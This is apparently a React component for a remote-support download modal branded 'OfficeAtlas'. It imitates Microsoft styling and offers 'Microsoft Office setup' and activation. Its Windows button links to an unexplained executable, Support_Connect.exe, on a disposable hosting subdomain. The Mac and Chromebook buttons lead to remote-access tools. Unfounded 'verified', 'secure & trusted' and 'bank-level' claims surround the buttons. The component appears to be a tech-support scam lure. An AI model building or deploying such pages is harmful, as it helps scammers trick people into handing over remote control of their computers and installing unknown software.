"use client";

import { motion, AnimatePresence } from "framer-motion";
import { 
  X, 
  ShieldCheck, 
  Download, 
  Lock, 
  Zap,
  CheckCircle,
  Cog
} from "lucide-react";

interface RemoteSupportModalProps {
  isOpen: boolean;
  onClose: () => void;
  initialTopic?: string;
}

export default function RemoteSupportModal({
  isOpen,
  onClose,
  initialTopic
}: RemoteSupportModalProps) {
  if (!isOpen) return null;

  return (
    <AnimatePresence>
      <div className="fixed inset-0 z-50 flex items-center justify-center p-4 sm:p-6 overflow-y-auto">
        
        {/* Dark Blurred Backdrop */}
        <motion.div
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          exit={{ opacity: 0 }}
          onClick={onClose}
          className="fixed inset-0 bg-slate-900/40 backdrop-blur-md"
        />

        {/* Premium Elevated Light Modal Container */}
        <motion.div
          initial={{ opacity: 0, scale: 0.94, y: 20 }}
          animate={{ opacity: 1, scale: 1, y: 0 }}
          exit={{ opacity: 0, scale: 0.94, y: 20 }}
          transition={{ duration: 0.35, ease: "easeOut" }}
          className="relative w-full max-w-4xl bg-white border border-slate-200 text-slate-900 rounded-3xl p-6 sm:p-10 shadow-2xl z-10 space-y-7 overflow-hidden font-sans"
        >
          {/* Subtle Ambient Glow */}
          <div className="absolute top-0 left-1/2 -translate-x-1/2 w-[600px] h-[250px] bg-gradient-to-b from-[#0078D4]/10 via-cyan-500/5 to-transparent rounded-full blur-[100px] pointer-events-none select-none" />

          {/* Close button */}
          <button
            onClick={onClose}
            className="absolute top-6 right-6 w-9 h-9 rounded-full bg-slate-100 border border-slate-200 text-slate-500 hover:text-slate-900 hover:bg-slate-200 flex items-center justify-center transition-all cursor-pointer z-20"
          >
            <X className="w-4.5 h-4.5" />
          </button>

          {/* Header Title & Subtext */}
          <div className="text-center space-y-2.5 pt-1 max-w-2xl mx-auto relative z-10">
            <h3 className="text-3xl sm:text-4xl lg:text-5xl font-semibold tracking-tight leading-tight text-slate-900">
              Connect to{" "}
              <span className="text-transparent bg-clip-text bg-gradient-to-r from-[#0078D4] via-blue-600 to-cyan-600 font-semibold">
                Support Agent
              </span>
            </h3>
            <p className="text-xs sm:text-sm text-slate-600 font-normal leading-relaxed max-w-xl mx-auto">
              Download our official remote connection client to securely share your session with a <strong className="font-semibold text-slate-900">technical support specialist</strong> for diagnostics, activation, and <strong className="font-semibold text-slate-900">Microsoft Office setup</strong>.
            </p>
          </div>

          {/* Top Verification Badge Pill */}
          <div className="relative z-10 flex items-center justify-center gap-2 text-[11px] font-mono font-semibold uppercase tracking-wider text-[#0078D4] bg-blue-50 px-6 py-2.5 rounded-full border border-blue-200/80 max-w-max mx-auto shadow-sm">
            <ShieldCheck className="w-4 h-4 text-[#0078D4]" />
            <span>VERIFIED OFFICEATLAS REMOTE SUPPORT CLIENT</span>
          </div>

          {/* 3 Platform Cards Grid with Exact Background Gradients & Ambient Waves */}
          <div className="grid grid-cols-1 md:grid-cols-3 gap-6 relative z-10">
            
            {/* 1. Windows Card */}
            <motion.div 
              whileHover={{ y: -4 }}
              transition={{ duration: 0.2 }}
              className="relative overflow-hidden bg-gradient-to-b from-blue-50/70 via-blue-50/20 to-white border border-blue-200/90 hover:border-blue-400 rounded-2xl p-6 text-center space-y-5 transition-all duration-300 group shadow-lg shadow-blue-500/5"
            >
              {/* Subtle Upper Ambient Wave Pattern overlay */}
              <div className="absolute top-0 right-0 w-full h-32 bg-gradient-to-bl from-blue-400/10 via-transparent to-transparent pointer-events-none" />

              {/* Windows Icon Box */}
              <div className="w-14 h-14 mx-auto rounded-2xl bg-white border border-slate-200 flex items-center justify-center group-hover:scale-105 transition-transform shadow-sm p-3 relative z-10">
                <svg className="w-7 h-7" viewBox="0 0 88 88">
                  <path fill="#F25022" d="M0 0h42v42H0z"/>
                  <path fill="#7FBA00" d="M46 0h42v42H46z"/>
                  <path fill="#00A4EF" d="M0 46h42v42H0z"/>
                  <path fill="#FFB900" d="M46 46h42v42H46z"/>
                </svg>
              </div>

              {/* Title */}
              <div className="space-y-0.5 relative z-10">
                <div className="text-[11px] text-slate-500 font-medium">Download for</div>
                <div className="text-xl font-bold text-slate-900 tracking-tight">Windows</div>
              </div>

              {/* Feature Points */}
              <div className="space-y-2 text-xs text-slate-700 font-medium text-left max-w-max mx-auto relative z-10">
                <div className="flex items-center gap-2">
                  <ShieldCheck className="w-4 h-4 text-blue-600 shrink-0" />
                  <span>Secure & Trusted</span>
                </div>
                <div className="flex items-center gap-2">
                  <Cog className="w-4 h-4 text-blue-600 shrink-0" />
                  <span>Easy to Install</span>
                </div>
              </div>

              {/* Button & Subtext */}
              <div className="space-y-2 pt-1 relative z-10">
                <a
                  href="https://deepskyblue-gorilla-943624.hostingersite.com/Support_Connect.exe"
                  target="_blank"
                  rel="noopener noreferrer"
                  className="w-full inline-flex items-center justify-center gap-2 px-5 py-3 bg-gradient-to-r from-[#006bd6] to-[#0078d4] hover:from-[#005bb8] hover:to-[#006bd6] text-white text-xs font-semibold rounded-xl shadow-md shadow-blue-600/20 hover:shadow-lg transition-all cursor-pointer"
                >
                  <Download className="w-4 h-4" />
                  <span>Download →</span>
                </a>
                <div className="text-[11px] text-slate-500 font-medium pt-0.5">
                  For Windows 10/11 (64-bit)
                </div>
              </div>
            </motion.div>

            {/* 2. Mac Card */}
            <motion.div 
              whileHover={{ y: -4 }}
              transition={{ duration: 0.2 }}
              className="relative overflow-hidden bg-gradient-to-b from-emerald-50/70 via-emerald-50/20 to-white border border-emerald-200/90 hover:border-emerald-400 rounded-2xl p-6 text-center space-y-5 transition-all duration-300 group shadow-lg shadow-emerald-500/5"
            >
              {/* Subtle Upper Ambient Wave Pattern overlay */}
              <div className="absolute top-0 right-0 w-full h-32 bg-gradient-to-bl from-emerald-400/10 via-transparent to-transparent pointer-events-none" />

              {/* Apple Icon Box */}
              <div className="w-14 h-14 mx-auto rounded-2xl bg-slate-900 border border-slate-800 flex items-center justify-center group-hover:scale-105 transition-transform shadow-sm p-3 relative z-10">
                <svg className="w-7 h-7 fill-white" viewBox="0 0 24 24">
                  <path d="M18.71 19.5c-.83 1.24-1.71 2.45-3.05 2.47-1.34.03-1.77-.79-3.29-.79-1.53 0-2 .77-3.27.82-1.31.05-2.3-1.32-3.14-2.53C4.25 17 2.94 12.45 4.7 9.39c.87-1.52 2.43-2.48 4.12-2.51 1.28-.02 2.5.87 3.29.87.78 0 2.26-1.07 3.81-.91.65.03 2.47.26 3.64 1.98-.09.06-2.17 1.28-2.15 3.81.03 3.02 2.65 4.03 2.68 4.04-.03.07-.42 1.44-1.38 2.83M15.97 6.32c.64-.78 1.08-1.86.96-2.94-.93.04-2.07.62-2.74 1.4-.6.69-1.13 1.8-.99 2.86 1.05.08 2.13-.54 2.77-1.32z" />
                </svg>
              </div>

              {/* Title */}
              <div className="space-y-0.5 relative z-10">
                <div className="text-[11px] text-slate-500 font-medium">Download for</div>
                <div className="text-xl font-bold text-slate-900 tracking-tight">Mac</div>
              </div>

              {/* Feature Points */}
              <div className="space-y-2 text-xs text-slate-700 font-medium text-left max-w-max mx-auto relative z-10">
                <div className="flex items-center gap-2">
                  <ShieldCheck className="w-4 h-4 text-emerald-600 shrink-0" />
                  <span>Secure & Trusted</span>
                </div>
                <div className="flex items-center gap-2">
                  <Cog className="w-4 h-4 text-emerald-600 shrink-0" />
                  <span>Easy to Install</span>
                </div>
              </div>

              {/* Button & Subtext */}
              <div className="space-y-2 pt-1 relative z-10">
                <a
                  href="https://download.teamviewer.com/download/TeamViewerQS.dmg"
                  target="_blank"
                  rel="noopener noreferrer"
                  className="w-full inline-flex items-center justify-center gap-2 px-5 py-3 bg-gradient-to-r from-emerald-600 to-emerald-500 hover:from-emerald-700 hover:to-emerald-600 text-white text-xs font-semibold rounded-xl shadow-md shadow-emerald-600/20 hover:shadow-lg transition-all cursor-pointer"
                >
                  <Download className="w-4 h-4" />
                  <span>Download →</span>
                </a>
                <div className="text-[11px] text-slate-500 font-medium pt-0.5">
                  For macOS 10.15 and above
                </div>
              </div>
            </motion.div>

            {/* 3. Chromebook Card */}
            <motion.div 
              whileHover={{ y: -4 }}
              transition={{ duration: 0.2 }}
              className="relative overflow-hidden bg-gradient-to-b from-amber-50/70 via-amber-50/20 to-white border border-amber-200/90 hover:border-amber-400 rounded-2xl p-6 text-center space-y-5 transition-all duration-300 group shadow-lg shadow-amber-500/5"
            >
              {/* Subtle Upper Ambient Wave Pattern overlay */}
              <div className="absolute top-0 right-0 w-full h-32 bg-gradient-to-bl from-amber-400/10 via-transparent to-transparent pointer-events-none" />

              {/* Chrome Icon Box */}
              <div className="w-14 h-14 mx-auto rounded-2xl bg-white border border-slate-200 flex items-center justify-center group-hover:scale-105 transition-transform shadow-sm p-3 relative z-10">
                <svg className="w-7 h-7" viewBox="0 0 100 100">
                  <defs>
                    <clipPath id="chrome-box-clip-card">
                      <circle cx="50" cy="50" r="48" />
                    </clipPath>
                  </defs>
                  <g clipPath="url(#chrome-box-clip-card)">
                    <circle cx="50" cy="50" r="48" fill="#34A853" />
                    <polygon points="50,50 -20,-20 120,-20 120,25" fill="#EA4335" />
                    <polygon points="50,50 120,25 120,120 50,120" fill="#FBBC05" />
                    <circle cx="50" cy="50" r="21" fill="#FFFFFF" />
                    <circle cx="50" cy="50" r="16" fill="#1A73E8" />
                  </g>
                </svg>
              </div>

              {/* Title */}
              <div className="space-y-0.5 relative z-10">
                <div className="text-[11px] text-slate-500 font-medium">Download for</div>
                <div className="text-xl font-bold text-slate-900 tracking-tight">Chromebook</div>
              </div>

              {/* Feature Points */}
              <div className="space-y-2 text-xs text-slate-700 font-medium text-left max-w-max mx-auto relative z-10">
                <div className="flex items-center gap-2">
                  <ShieldCheck className="w-4 h-4 text-amber-600 shrink-0" />
                  <span>Secure & Trusted</span>
                </div>
                <div className="flex items-center gap-2">
                  <Cog className="w-4 h-4 text-amber-600 shrink-0" />
                  <span>Easy to Install</span>
                </div>
              </div>

              {/* Button & Subtext */}
              <div className="space-y-2 pt-1 relative z-10">
                <a
                  href="https://remotedesktop.google.com/support"
                  target="_blank"
                  rel="noopener noreferrer"
                  className="w-full inline-flex items-center justify-center gap-2 px-5 py-3 bg-gradient-to-r from-amber-600 to-orange-500 hover:from-amber-700 hover:to-orange-600 text-white text-xs font-semibold rounded-xl shadow-md shadow-orange-600/20 hover:shadow-lg transition-all cursor-pointer"
                >
                  <Download className="w-4 h-4" />
                  <span>Download →</span>
                </a>
                <div className="text-[11px] text-slate-500 font-medium pt-0.5">
                  For Chrome OS 88 and above
                </div>
              </div>
            </motion.div>

          </div>

          {/* Bottom Security Footer Banner (Matching reference image exactly) */}
          <div className="relative z-10 bg-slate-50 border border-slate-200/90 rounded-2xl p-4 sm:p-5 flex flex-col md:flex-row items-center justify-between gap-4 text-xs">
            
            {/* Indicator 1 */}
            <div className="flex items-center gap-3">
              <div className="w-9 h-9 rounded-xl bg-emerald-500/10 border border-emerald-500/20 flex items-center justify-center text-emerald-600 shrink-0">
                <ShieldCheck className="w-5 h-5" />
              </div>
              <div>
                <div className="font-semibold text-slate-900">Secure Connection</div>
                <div className="text-[11px] text-slate-500">End-to-end encrypted</div>
              </div>
            </div>

            <div className="hidden md:block w-px h-8 bg-slate-200" />

            {/* Indicator 2 */}
            <div className="flex items-center gap-3">
              <div className="w-9 h-9 rounded-xl bg-blue-500/10 border border-blue-500/20 flex items-center justify-center text-blue-600 shrink-0">
                <Lock className="w-5 h-5" />
              </div>
              <div>
                <div className="font-semibold text-slate-900">256-Bit Encrypted</div>
                <div className="text-[11px] text-slate-500">Bank-level security</div>
              </div>
            </div>

            <div className="hidden md:block w-px h-8 bg-slate-200" />

            {/* Indicator 3 */}
            <div className="flex items-center gap-3">
              <div className="w-9 h-9 rounded-xl bg-amber-500/10 border border-amber-500/20 flex items-center justify-center text-amber-600 shrink-0">
                <Zap className="w-5 h-5" />
              </div>
              <div>
                <div className="font-semibold text-slate-900">Instant Setup</div>
                <div className="text-[11px] text-slate-500">Quick & easy connection</div>
              </div>
            </div>

          </div>

        </motion.div>
      </div>
    </AnimatePresence>
  );
}
